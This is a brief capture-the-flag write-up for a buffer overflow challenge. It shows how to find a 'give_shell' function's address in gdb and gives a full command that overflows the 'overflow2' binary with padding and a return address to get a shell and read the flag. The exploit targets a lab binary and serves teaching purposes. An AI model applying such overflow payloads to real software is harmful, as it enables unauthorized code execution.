Slightly more difficult overflow, but generally, we want to execute `give_shell`. Get the address using gdb: `p give_shell`.

Then run `./overflow2 $(printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb0\x84\x04\x08")`, and you can cat the flag!